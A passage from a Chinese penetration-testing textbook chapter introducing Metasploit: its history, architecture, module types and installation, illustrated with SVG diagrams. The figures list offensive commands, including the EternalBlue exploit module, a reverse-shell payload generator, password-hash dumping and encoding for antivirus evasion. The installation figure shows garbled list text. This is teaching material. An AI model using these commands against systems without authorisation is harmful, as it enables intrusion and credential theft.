# 第三章：Metasploit - 渗透测试框架

## 3.1 Metasploit 简介


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 500" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s01g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s01b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s01r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s01a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s01s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s01g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-1 Metasploit 是什么：黑客武器库 4 层分层模型</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">弹药 → 发射 → 命中 → 占领 全流程一体化</text>  <rect x="80" y="130" width="300" height="46" rx="10" fill="#0ea5e9" opacity="0.15" stroke="#0ea5e9" stroke-width="1.6"/>  <text x="100" y="158" font-size="15" font-weight="700" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">侦察情报层</text>  <text x="290" y="160" font-size="12.5" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">Auxiliary / Scanner / Sniffer / Nmap 联动</text>  <rect x="80" y="190" width="340" height="46" rx="10" fill="#a855f7" opacity="0.15" stroke="#a855f7" stroke-width="1.6"/>  <text x="100" y="218" font-size="15" font-weight="700" fill="#a855f7" font-family="Microsoft YaHei,Arial">漏洞利用层（子弹）</text>  <text x="290" y="220" font-size="12.5" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">Exploit 2000+：MS17-010 / S2 / Log4j</text>  <rect x="80" y="250" width="340" height="46" rx="10" fill="#ef4444" opacity="0.15" stroke="#ef4444" stroke-width="1.6"/>  <text x="100" y="278" font-size="15" font-weight="700" fill="#ef4444" font-family="Microsoft YaHei,Arial">载荷攻击层（弹头）</text>  <text x="290" y="280" font-size="12.5" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">Payload 500+：Meterpreter / Bind / Reverse / PS1</text>  <rect x="80" y="310" width="340" height="46" rx="10" fill="#10b981" opacity="0.15" stroke="#10b981" stroke-width="1.6"/>  <text x="100" y="338" font-size="15" font-weight="700" fill="#10b981" font-family="Microsoft YaHei,Arial">后渗透占领层</text>  <text x="290" y="340" font-size="12.5" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">Post + Meterpreter：提权/哈希/横向/持久化</text>  <path d="M950,120 L950,360" stroke="#60a5fa" stroke-width="3" fill="none" stroke-dasharray="6 4" marker-end="url(#s01a)"/>  <text x="965" y="240" transform="rotate(90 965 240)" font-size="13" fill="#fde68a" font-weight="700" font-family="Microsoft YaHei,Arial">攻击流程（单向推进）</text>  <text x="540.0" y="470" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">MSF 把渗透测试 4 大阶段标准化为模块</text>
</svg>



<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 490" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s02g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s02b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s02r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s02a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s02s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s02g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-2 Metasploit 七大核心能力矩阵</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">做什么/用什么模块/一条命令怎么跑</text>  <rect x="40" y="110" width="240" height="42" fill="#1e293b" stroke="#6366f1"/>  <text x="160.0" y="136" text-anchor="middle" fill="#bfdbfe" font-size="13" font-weight="700" font-family="Microsoft YaHei,Arial">能力（7 大类）</text>  <rect x="290" y="110" width="350" height="42" fill="#1e293b" stroke="#6366f1"/>  <text x="465.0" y="136" text-anchor="middle" fill="#bfdbfe" font-size="13" font-weight="700" font-family="Microsoft YaHei,Arial">模块说明</text>  <rect x="650" y="110" width="400" height="42" fill="#1e293b" stroke="#6366f1"/>  <text x="850.0" y="136" text-anchor="middle" fill="#bfdbfe" font-size="13" font-weight="700" font-family="Microsoft YaHei,Arial">对应可执行命令</text>  <rect x="40" y="152" width="240" height="42" fill="#111c35" stroke="#334155"/>  <rect x="290" y="152" width="350" height="42" fill="#111c35" stroke="#334155"/>  <rect x="650" y="152" width="400" height="42" fill="#111c35" stroke="#334155"/>  <rect x="40" y="152" width="6" height="42" fill="#ef4444"/>  <text x="60" y="178" fill="#f8fafc" font-size="13" font-weight="700" font-family="Microsoft YaHei,Arial">① 漏洞利用 Exploit</text>  <text x="300" y="178" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei,Arial">2000+ 现成 PoC，按 CVE/服务/平台分类</text>  <text x="658" y="179" fill="#93c5fd" font-size="10.5" font-family="Consolas,Monospace">use exploit/windows/smb/ms17_010_eternalblue</text>  <rect x="40" y="194" width="240" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="290" y="194" width="350" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="650" y="194" width="400" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="40" y="194" width="6" height="42" fill="#f59e0b"/>  <text x="60" y="220" fill="#f8fafc" font-size="13" font-weight="700" font-family="Microsoft YaHei,Arial">② 载荷生成 Payload</text>  <text x="300" y="220" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei,Arial">500+ 载荷：EXE/ELF/PHP/PS1/APK 全格式</text>  <text x="658" y="221" fill="#93c5fd" font-size="10.5" font-family="Consolas,Monospace">msfvenom -p windows/x64/meterpreter/reverse_tcp ...</text>  <rect x="40" y="236" width="240" height="42" fill="#111c35" stroke="#334155"/>  <rect x="290" y="236" width="350" height="42" fill="#111c35" stroke="#334155"/>  <rect x="650" y="236" width="400" height="42" fill="#111c35" stroke="#334155"/>  <rect x="40" y="236" width="6" height="42" fill="#0ea5e9"/>  <text x="60" y="262" fill="#f8fafc" font-size="13" font-weight="700" font-family="Microsoft YaHei,Arial">③ 辅助侦察 Auxiliary</text>  <text x="300" y="262" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei,Arial">1000+ 扫描/爆破/嗅探/Fuzzer</text>  <text x="658" y="263" fill="#93c5fd" font-size="10.5" font-family="Consolas,Monospace">use auxiliary/scanner/portscan/tcp</text>  <rect x="40" y="278" width="240" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="290" y="278" width="350" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="650" y="278" width="400" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="40" y="278" width="6" height="42" fill="#10b981"/>  <text x="60" y="304" fill="#f8fafc" font-size="13" font-weight="700" font-family="Microsoft YaHei,Arial">④ 后渗透 Post</text>  <text x="300" y="304" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei,Arial">300+ 提权/哈希/横向/持久化/痕迹清理</text>  <text x="658" y="305" fill="#93c5fd" font-size="10.5" font-family="Consolas,Monospace">use post/windows/gather/hashdump</text>  <rect x="40" y="320" width="240" height="42" fill="#111c35" stroke="#334155"/>  <rect x="290" y="320" width="350" height="42" fill="#111c35" stroke="#334155"/>  <rect x="650" y="320" width="400" height="42" fill="#111c35" stroke="#334155"/>  <rect x="40" y="320" width="6" height="42" fill="#8b5cf6"/>  <text x="60" y="346" fill="#f8fafc" font-size="13" font-weight="700" font-family="Microsoft YaHei,Arial">⑤ 编码免杀 Encoder</text>  <text x="300" y="346" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei,Arial">50+ 编码器 shikata_ga_nai/xor</text>  <text x="658" y="347" fill="#93c5fd" font-size="10.5" font-family="Consolas,Monospace">msfvenom -e x64/xor -i 20 -f raw</text>  <rect x="40" y="362" width="240" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="290" y="362" width="350" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="650" y="362" width="400" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="40" y="362" width="6" height="42" fill="#ec4899"/>  <text x="60" y="388" fill="#f8fafc" font-size="13" font-weight="700" font-family="Microsoft YaHei,Arial">⑥ 密码破解</text>  <text x="300" y="388" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei,Arial">集成 John/Hashcat，SMB/SSH/HTTP 爆</text>  <text x="658" y="389" fill="#93c5fd" font-size="10.5" font-family="Consolas,Monospace">use auxiliary/scanner/smb/smb_login</text>  <rect x="40" y="404" width="240" height="42" fill="#111c35" stroke="#334155"/>  <rect x="290" y="404" width="350" height="42" fill="#111c35" stroke="#334155"/>  <rect x="650" y="404" width="400" height="42" fill="#111c35" stroke="#334155"/>  <rect x="40" y="404" width="6" height="42" fill="#06b6d4"/>  <text x="60" y="430" fill="#f8fafc" font-size="13" font-weight="700" font-family="Microsoft YaHei,Arial">⑦ 网络嗅探隧道</text>  <text x="300" y="430" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei,Arial">Meterpreter sniffer + portfwd 内网穿透</text>  <text x="658" y="431" fill="#93c5fd" font-size="10.5" font-family="Consolas,Monospace">use post/windows/manage/portproxy</text>  <text x="540.0" y="455" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">覆盖红队前/中/后全链路：前期侦察、中期打点、后期内网一条龙</text>
</svg>


### 什么是 Metasploit？

想象你要测试一座大楼的安全性。传统的做法是：
- 手动检查每个门锁
- 手动尝试每个漏洞
- 手动编写攻击脚本

这样做效率很低，而且容易遗漏。

**Metasploit** 就像一个"黑客武器库"，它提供了：
- 数千个现成的漏洞利用模块
- 各种攻击载荷（Payload）
- 后渗透工具
- 自动化攻击流程

简单来说，Metasploit是**渗透测试的终极框架**，让你能够快速、高效地进行安全测试。

### Metasploit 的历史

Metasploit由HD Moore在2003年创建，最初是一个开源项目。2009年被Rapid7收购后，发展成为：
- **Metasploit Framework**：免费开源版本
- **Metasploit Pro**：商业版本，增加图形界面和自动化功能

### Metasploit 能做什么？

| 功能 | 说明 | 通俗理解 |
|------|------|----------|
| 漏洞利用 | 利用已知漏洞获取访问权限 | 找到漏洞，突破防线 |
| Payload生成 | 生成恶意代码 | 制作攻击武器 |
| 后渗透 | 在目标系统上执行操作 | 在突破后继续探索 |
| 信息收集 | 收集目标信息 | 情报侦察 |
| 密码破解 | 破解密码哈希 | 暴力破解密码 |
| 网络嗅探 | 捕获网络流量 | 监听通信 |

---

## 3.2 Metasploit 架构详解


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 470" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s03g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s03b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s03r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s03a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s03s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s03g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-3 Metasploit 架构全景 6 层分层图</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">理解层次=理解源码，二次开发不迷路</text>  <rect x="60" y="60" width="960" height="44" rx="10" fill="#0f172a" stroke="#6366f1" stroke-width="1.8"/>  <rect x="60" y="60" width="180" height="44" rx="10" fill="#6366f1" opacity="0.18"/>  <text x="150" y="87" text-anchor="middle" font-size="14" font-weight="700" fill="#6366f1" font-family="Microsoft YaHei,Arial">用户交互层</text>  <text x="260" y="87" font-size="13" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">MSFconsole / Armitage / MSFcli / Web Pro</text>  <rect x="60" y="120" width="960" height="44" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.8"/>  <rect x="60" y="120" width="180" height="44" rx="10" fill="#8b5cf6" opacity="0.18"/>  <text x="150" y="147" text-anchor="middle" font-size="14" font-weight="700" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">接口层</text>  <text x="260" y="147" font-size="13" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">REPL CLI / RPC / REST API / JSON-RPC</text>  <rect x="60" y="180" width="960" height="44" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.8"/>  <rect x="60" y="180" width="180" height="44" rx="10" fill="#a855f7" opacity="0.18"/>  <text x="150" y="207" text-anchor="middle" font-size="14" font-weight="700" fill="#a855f7" font-family="Microsoft YaHei,Arial">模块加载层</text>  <text x="260" y="207" font-size="13" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">Rex::Module::Manager + Plugin 插件系统</text>  <rect x="60" y="240" width="960" height="44" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="1.8"/>  <rect x="60" y="240" width="180" height="44" rx="10" fill="#ec4899" opacity="0.18"/>  <text x="150" y="267" text-anchor="middle" font-size="14" font-weight="700" fill="#ec4899" font-family="Microsoft YaHei,Arial">框架核心层</text>  <text x="260" y="267" font-size="13" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">Framework Core（Session / Job / Event / DB）</text>  <rect x="60" y="300" width="960" height="44" rx="10" fill="#0f172a" stroke="#06b6d4" stroke-width="1.8"/>  <rect x="60" y="300" width="180" height="44" rx="10" fill="#06b6d4" opacity="0.18"/>  <text x="150" y="327" text-anchor="middle" font-size="14" font-weight="700" fill="#06b6d4" font-family="Microsoft YaHei,Arial">基础库 Rex</text>  <text x="260" y="327" font-size="13" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">Socket / SSL / SMB / HTTP / MSSQL / ASM</text>  <rect x="60" y="360" width="960" height="44" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.8"/>  <rect x="60" y="360" width="180" height="44" rx="10" fill="#0ea5e9" opacity="0.18"/>  <text x="150" y="387" text-anchor="middle" font-size="14" font-weight="700" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">操作系统/网络</text>  <text x="260" y="387" font-size="13" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">Kali Linux / Windows / Ruby / PostgreSQL</text>  <path d="M1000,104 L1000,120" stroke="#60a5fa" stroke-width="2.6" fill="none" marker-end="url(#s01a)"/>  <path d="M1000,164 L1000,180" stroke="#60a5fa" stroke-width="2.6" fill="none" marker-end="url(#s01a)"/>  <path d="M1000,224 L1000,240" stroke="#60a5fa" stroke-width="2.6" fill="none" marker-end="url(#s01a)"/>  <path d="M1000,284 L1000,300" stroke="#60a5fa" stroke-width="2.6" fill="none" marker-end="url(#s01a)"/>  <path d="M1000,344 L1000,360" stroke="#60a5fa" stroke-width="2.6" fill="none" marker-end="url(#s01a)"/>  <text x="540.0" y="440" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">底层 Rex 负责所有协议握手；中间 Core 管会话和数据库；上层仅负责交互</text>
</svg>



<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 480" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s04g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s04b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s04r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s04a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s04s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s04g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-4 六大模块关系 + 数量总览</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">数据流顺序：Aux 侦察 → Exploit 打洞 → Encoder → Payload → Post</text>  <text x="60" y="128" font-size="12.5" font-weight="600" fill="#ef4444" font-family="Microsoft YaHei,Arial">Exploit 漏洞利用</text>  <text x="230" y="128" text-anchor="end" font-size="11" fill="#cbd5e1" font-family="Consolas,Monospace">2,200</text>  <rect x="240" y="108" width="457.6" height="22" rx="5" fill="#ef4444" opacity="0.75"/>  <rect x="240" y="108" width="520" height="22" rx="5" fill="none" stroke="#334155"/>  <text x="60" y="183" font-size="12.5" font-weight="600" fill="#f59e0b" font-family="Microsoft YaHei,Arial">Payload 攻击载荷</text>  <text x="230" y="183" text-anchor="end" font-size="11" fill="#cbd5e1" font-family="Consolas,Monospace">560</text>  <rect x="240" y="163" width="116.48" height="22" rx="5" fill="#f59e0b" opacity="0.75"/>  <rect x="240" y="163" width="520" height="22" rx="5" fill="none" stroke="#334155"/>  <text x="60" y="238" font-size="12.5" font-weight="600" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Auxiliary 辅助</text>  <text x="230" y="238" text-anchor="end" font-size="11" fill="#cbd5e1" font-family="Consolas,Monospace">1,180</text>  <rect x="240" y="218" width="245.44" height="22" rx="5" fill="#0ea5e9" opacity="0.75"/>  <rect x="240" y="218" width="520" height="22" rx="5" fill="none" stroke="#334155"/>  <text x="60" y="293" font-size="12.5" font-weight="600" fill="#10b981" font-family="Microsoft YaHei,Arial">Post 后渗透</text>  <text x="230" y="293" text-anchor="end" font-size="11" fill="#cbd5e1" font-family="Consolas,Monospace">340</text>  <rect x="240" y="273" width="70.72" height="22" rx="5" fill="#10b981" opacity="0.75"/>  <rect x="240" y="273" width="520" height="22" rx="5" fill="none" stroke="#334155"/>  <text x="60" y="348" font-size="12.5" font-weight="600" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">Encoder 编码器</text>  <text x="230" y="348" text-anchor="end" font-size="11" fill="#cbd5e1" font-family="Consolas,Monospace">58</text>  <rect x="240" y="328" width="12.064" height="22" rx="5" fill="#8b5cf6" opacity="0.75"/>  <rect x="240" y="328" width="520" height="22" rx="5" fill="none" stroke="#334155"/>  <text x="60" y="403" font-size="12.5" font-weight="600" fill="#06b6d4" font-family="Microsoft YaHei,Arial">Nops 空指令</text>  <text x="230" y="403" text-anchor="end" font-size="11" fill="#cbd5e1" font-family="Consolas,Monospace">14</text>  <rect x="240" y="383" width="2.912" height="22" rx="5" fill="#06b6d4" opacity="0.75"/>  <rect x="240" y="383" width="520" height="22" rx="5" fill="none" stroke="#334155"/>  <circle cx="920.0" cy="166.07695154586736" r="38" fill="#0f172a" stroke="#0ea5e9" stroke-width="2"/>  <text x="920.0" y="170.07695154586736" text-anchor="middle" font-size="11.5" font-weight="700" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Aux 侦察</text>  <path d="M890.0,166.07695154586736 L830.0,166.07695154586736" stroke="#0ea5e9" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <circle cx="800.0" cy="166.07695154586736" r="38" fill="#0f172a" stroke="#ef4444" stroke-width="2"/>  <text x="800.0" y="170.07695154586736" text-anchor="middle" font-size="11.5" font-weight="700" fill="#ef4444" font-family="Microsoft YaHei,Arial">Exploit 利用</text>  <path d="M785.0,192.05771365940052 L755.0,244.01923788646684" stroke="#ef4444" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <circle cx="740.0" cy="270.0" r="38" fill="#0f172a" stroke="#8b5cf6" stroke-width="2"/>  <text x="740.0" y="274.0" text-anchor="middle" font-size="11.5" font-weight="700" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">Encoder 编码</text>  <path d="M755.0,295.98076211353316 L785.0,347.9422863405995" stroke="#8b5cf6" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <circle cx="800.0" cy="373.92304845413264" r="38" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>  <text x="800.0" y="377.92304845413264" text-anchor="middle" font-size="11.5" font-weight="700" fill="#f59e0b" font-family="Microsoft YaHei,Arial">Payload 投递</text>  <path d="M830.0,373.92304845413264 L890.0,373.92304845413264" stroke="#f59e0b" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <circle cx="920.0" cy="373.92304845413264" r="38" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>  <text x="920.0" y="377.92304845413264" text-anchor="middle" font-size="11.5" font-weight="700" fill="#06b6d4" font-family="Microsoft YaHei,Arial">Nops 填充</text>  <path d="M935.0,347.9422863405995 L965.0,295.9807621135332" stroke="#06b6d4" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <circle cx="980.0" cy="270.00000000000006" r="38" fill="#0f172a" stroke="#10b981" stroke-width="2"/>  <text x="980.0" y="274.00000000000006" text-anchor="middle" font-size="11.5" font-weight="700" fill="#10b981" font-family="Microsoft YaHei,Arial">Post 后渗</text>  <path d="M965.0,244.0192378864669 L935.0,192.05771365940052" stroke="#10b981" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <circle cx="860" cy="270" r="50" fill="#1e293b" stroke="#60a5fa" stroke-dasharray="4 4"/>  <text x="860" y="274" text-anchor="middle" font-size="14" font-weight="800" fill="#fde68a" font-family="Microsoft YaHei,Arial">攻击流水线</text>  <text x="540.0" y="450" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">Exploit 最多=漏洞 PoC 积累最多；Auxiliary 第二=侦察工具最丰富</text>
</svg>


### 核心组成

Metasploit由多个工具组成：

| 工具 | 说明 | 用途 |
|------|------|------|
| MSFconsole | 命令行控制台 | 主要操作界面 |
| MSFvenom | Payload生成器 | 生成恶意代码 |
| MSFrpc | RPC接口 | 远程控制 |
| MSFrpcd | RPC服务器 | 远程服务 |
| Armitage | 图形界面 | 可视化操作 |

### 模块分类

Metasploit有六大模块：

| 模块 | 说明 | 数量（约） |
|------|------|------------|
| Exploit | 漏洞利用 | 2000+ |
| Payload | 攻击载荷 | 500+ |
| Auxiliary | 辅助模块 | 1000+ |
| Post | 后渗透模块 | 300+ |
| Encoder | 编码器 | 50+ |
| Nops | 空指令 | 10+ |

#### Exploit（漏洞利用模块）

Exploit模块利用已知漏洞获取目标系统访问权限。

**通俗理解：** 像一把钥匙，对应特定的锁（漏洞）。

**分类：**
- 按平台：Windows、Linux、Android、iOS
- 按服务：HTTP、FTP、SSH、SMB
- 按漏洞类型：远程溢出、本地提权、Web漏洞

#### Payload（攻击载荷模块）

Payload是漏洞利用成功后执行的恶意代码。

**通俗理解：** 像突破门后带入的工具。

**分类：**
- Bind Shell：在目标开端口等待连接
- Reverse Shell：主动连接攻击者
- Meterpreter：高级交互式Shell
- Execute：执行命令或程序
- Download：下载文件

#### Auxiliary（辅助模块）

辅助模块不直接利用漏洞，但提供各种辅助功能。

**通俗理解：** 像侦察兵、探路者。

**分类：**
- Scanner：扫描模块
- Crawler：爬虫模块
- Fuzzer：模糊测试模块
- Sniffer：嗅探模块
- Spoof：欺骗模块

#### Post（后渗透模块）

后渗透模块在获取Shell后执行，进行进一步操作。

**通俗理解：** 像进入房间后翻找保险柜。

**分类：**
- 信息收集：收集系统信息
- 权限提升：获取更高权限
- 持久化：维持访问权限
- 凭证获取：获取密码哈希
- 网络探测：探索内网

#### Encoder（编码器模块）

编码器用于混淆Payload，避免被检测。

**通俗理解：** 像把攻击武器伪装成普通物品。

**常用编码器：**
- x86/shikata_ga_nai：最常用的编码器
- cmd/powershell_base64：PowerShell编码
- x86/countdown：计数编码

#### Nops（空指令模块）

空指令用于填充Payload，保持稳定性。

---

## 3.3 Kali Linux 内置安装与更新


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 510" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s05g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s05b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s05r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s05a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s05s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s05g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-5 三大平台安装 MSF 步骤对比：Kali / Windows / Linux</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">左=新手最容易；中=Windows/Docker；右=服务器源码安装</text>  <rect x="40" y="70" width="300" height="40" rx="8" fill="#0ea5e9" opacity="0.18" stroke="#0ea5e9"/>  <text x="190.0" y="95" text-anchor="middle" font-size="15" font-weight="700" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Kali Linux（推荐）</text>  <rect x="40" y="120" width="300" height="62" rx="8" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2"/>  <text x="52" y="140" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 1</text>  <text x="52" y="160" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['1. 系统自带无需下载', '1. 官网下载 Windows 安装包', '1. curl msfinstall &gt; msfinstall']</text>  <rect x="40" y="190" width="300" height="62" rx="8" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2"/>  <text x="52" y="210" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 2</text>  <text x="52" y="230" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['2. sudo systemctl start postgresql', '2. 管理员身份安装，勾选组件', '2. chmod 755 msfinstall ; sudo ./msfinstall']</text>  <rect x="40" y="260" width="300" height="62" rx="8" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2"/>  <text x="52" y="280" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 3</text>  <text x="52" y="300" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['3. msfdb init 初始化数据库', '3. cmd 执行 msfconsole.bat', '3. sudo msfdb init']</text>  <rect x="40" y="330" width="300" height="62" rx="8" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2"/>  <text x="52" y="350" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 4</text>  <text x="52" y="370" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['4. msfconsole 直接进入', '4. 或 docker run metasploitframework', '4. git clone 源码安装亦可']</text>  <rect x="40" y="400" width="300" height="62" rx="8" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2"/>  <text x="52" y="420" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 5</text>  <text x="52" y="440" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['5. msfupdate 一键升级', '5. 首次启动生成 DB config', '5. ./msfupdate 